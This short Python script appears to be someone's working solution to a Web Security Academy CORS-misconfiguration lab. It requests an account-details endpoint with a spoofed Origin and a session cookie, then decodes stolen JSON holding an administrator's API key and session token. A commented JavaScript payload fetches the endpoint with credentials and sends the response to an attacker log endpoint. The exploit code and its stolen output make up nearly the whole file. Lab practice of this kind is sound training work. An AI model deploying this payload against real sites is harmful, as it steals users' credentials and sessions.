import requests
import urllib.parse

url = "https://0aaf00e4040fee1bc17d977f009900a0.web-security-academy.net/accountDetails"

cookies = {
    "session": "jXbOpE0nY0so09d4WIxnObv7yOvzNFcS"
}

headers = {
    "Origin": "https://example.com"
}

# r = requests.get(url, cookies=cookies, headers=headers)
# print(r.headers['Access-Control-Allow-Origin'])
# print(r.headers['Access-Control-Allow-Credentials'])
# print(r.text)

key = "{%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22j1f3EgeELoL4FZjX46Wvt7txKcXzNWBb%22,%20%20%22sessions%22:%20[%20%20%20%20%22ZsnDffxJactg6c5EUpYmhwZ3bEKUyC10%22%20%20]}"
print(urllib.parse.unquote(key))
# <script>
#     var req = new XMLHttpRequest();
#     req.onload = reqListener;
#     req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
#     req.withCredentials = true;
#     req.send();

#     function reqListener() {
#         location='/log?key='+this.responseText;
#     };
# </script>
